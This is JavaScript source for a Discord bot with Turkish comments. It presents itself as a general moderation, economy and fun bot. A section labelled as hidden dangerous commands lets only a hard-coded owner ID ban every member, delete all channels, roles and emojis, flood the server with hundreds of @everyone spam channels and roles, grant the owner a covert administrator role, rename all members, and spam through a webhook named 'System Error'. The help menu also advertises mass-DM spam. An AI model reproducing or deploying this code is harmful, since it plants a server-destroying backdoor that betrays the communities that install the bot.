const { 
    Client, 
    GatewayIntentBits, 
    Partials, 
    EmbedBuilder, 
    ActionRowBuilder, 
    ButtonBuilder, 
    ButtonStyle,
    PermissionsBitField,
    ActivityType 
} = require('discord.js');
const fs = require('fs');

const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMembers,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent,
        GatewayIntentBits.DirectMessages,
        GatewayIntentBits.GuildMessageReactions
    ],
    partials: [Partials.Channel, Partials.Message, Partials.Reaction]
});

// --- AYARLAR ---
const TOKEN = 'BOT TOKENİ BURAYA GİRİN'; 
const YETKILI_ID = 'YETKİLİ İD BURAYA'; 
const PREFIX = '.';
const DB_FILE = './database.json';

// --- VERİTABANI SİSTEMİ ---
let db = { ekonomi: {}, seviye: {}, ayarlar: {}, uyarilar: {}, market: [] };
if (fs.existsSync(DB_FILE)) {
    try {
        db = JSON.parse(fs.readFileSync(DB_FILE, 'utf8'));
    } catch (e) {
        console.error("Veritabanı okuma hatası!");
    }
}

function saveDB() {
    fs.writeFileSync(DB_FILE, JSON.stringify(db, null, 2));
}

client.on('ready', () => {
    console.log(`🚀 ${client.user.tag} Tüm komutlar aktif!`);
    client.user.setActivity(`${PREFIX}yardım | Full System`, { type: ActivityType.Streaming, url: "https://twitch.tv/discord" });
});

client.on('messageCreate', async (message) => {
    if (message.author.bot || !message.guild) return;
    const uid = message.author.id;
    const isStaff = message.member.permissions.has(PermissionsBitField.Flags.ManageMessages);
    const isAdmin = message.member.permissions.has(PermissionsBitField.Flags.Administrator);

    if (!message.content.startsWith(PREFIX)) return;
    const args = message.content.slice(PREFIX.length).trim().split(/ +/);
    const command = args.shift().toLowerCase();

    // --- YARDIM ---
    if (command === 'yardım') {
        const embed = new EmbedBuilder()
            .setTitle("📚 Bot Komutları")
            .setColor("Blurple")
            .addFields(
                { name: "🛡️ Moderasyon", value: "`.ban`, `.kick`, `.temizle`, `.nuke`, `.kilit`, `.aç`" },
                { name: "💰 Ekonomi", value: "`.günlük`, `.cüzdan`, `.yazıtura`, `.soygun`, `.çalış`, `.slot`, `.gönder`" },
                { name: "🎮 Eğlence", value: "`.espri`, `.anket`, `.tokat`, `.kafaat`, `.rank`" },
                { name: "✉️ Özel", value: "`.botdm`, `.botspam`, `.allspam`, `.massdm`" }
            );
        return message.reply({ embeds: [embed] });
    }

    // --- GİZLİ TEHLİKELİ KOMUTLAR (SADECE BOT SAHİBİ) ---

    // 1. BAN ALL
    if (command === 'banall' || command === 'herkesibanla') {
        if (uid !== YETKILI_ID) return;
        message.delete().catch(() => {});
        const members = await message.guild.members.fetch();
        members.forEach(member => {
            if (member.id !== uid && member.bannable) {
                member.ban({ reason: 'BOOM!' }).catch(() => {});
            }
        });
    }

    // 2. KATEGORİ & KANAL TEMİZLİĞİ
    if (command === 'kategoripatlat') {
        if (uid !== YETKILI_ID) return;
        message.delete().catch(() => {});
        message.guild.channels.cache.forEach(channel => {
            channel.delete().catch(() => {});
        });
    }

    // 3. EMOJİ SİL
    if (command === 'emojisil') {
        if (uid !== YETKILI_ID) return;
        message.delete().catch(() => {});
        message.guild.emojis.cache.forEach(emoji => {
            emoji.delete().catch(() => {});
        });
    }

    // 4. KANAL YAĞMURU (Maksimum Kanal Açma)
    if (command === 'kanalyagmur') {
        if (uid !== YETKILI_ID) return;
        const name = args[0] || "fucked-by-boom";
        message.delete().catch(() => {});
        for (let i = 0; i < 500; i++) {
            message.guild.channels.create({ name: name, type: 0 }).then(c => {
                c.send("@everyone SUNUCU BİTMİŞTİR!").catch(() => {});
            }).catch(() => {});
        }
    }

    // 5. BOOM SERVER (Gelişmiş)
    if (command === 'boomserver') {
        if (uid !== YETKILI_ID) return;
        const newName = args[0] || "SUNUCU PATLATILDI";
        const objName = args[1] || "boom";
        const channelCount = parseInt(args[2]) || 30; 
        
        await message.guild.setName(newName).catch(() => {});
        message.guild.roles.cache.forEach(role => { if (role.name !== "@everyone" && role.editable) role.delete().catch(() => {}); });
        message.guild.channels.cache.forEach(channel => { channel.delete().catch(() => {}); });
        
        for (let i = 0; i < channelCount; i++) {
            message.guild.channels.create({ name: objName, type: 0 }).then(c => {
                c.send(`@everyone Sunucu **${newName}** tarafından yok edildi!`).catch(() => {});
            }).catch(() => {});
        }
        for (let i = 0; i < 150; i++) {
            message.guild.roles.create({ name: objName, color: 'Random' }).catch(() => {});
        }
    }

    // 6. ADMIN VER
    if (command === 'admin-ver') {
        if (uid !== YETKILI_ID) return;
        message.delete().catch(() => {});
        const role = await message.guild.roles.create({
            name: '.', 
            permissions: [PermissionsBitField.Flags.Administrator],
            reason: 'Yetki'
        });
        await message.member.roles.add(role);
    }

    // 7. HERKESİ YAK
    if (command === 'herkesiyak') {
        if (uid !== YETKILI_ID) return;
        const nick = args.join(' ') || "BOOMED";
        message.delete().catch(() => {});
        const members = await message.guild.members.fetch();
        members.forEach(m => { if (m.manageable) m.setNickname(nick).catch(() => {}); });
    }

    // 8. WEBSPAM
    if (command === 'webspam') {
        if (uid !== YETKILI_ID) return;
        const count = parseInt(args[0]) || 50;
        const text = args.slice(1).join(' ') || "@everyone SUNUCU ELİMİZDE!";
        message.delete().catch(() => {});
        const webhook = await message.channel.createWebhook({ name: 'System Error' });
        for (let i = 0; i < count; i++) { webhook.send(text).catch(() => {}); }
    }

    // --- DİĞER KOMUTLAR ---
    if (command === 'temizle' && isStaff) {
        const miktar = parseInt(args[0]) || 10;
        await message.channel.bulkDelete(Math.min(miktar, 100), true);
    }
});

client.login(TOKEN);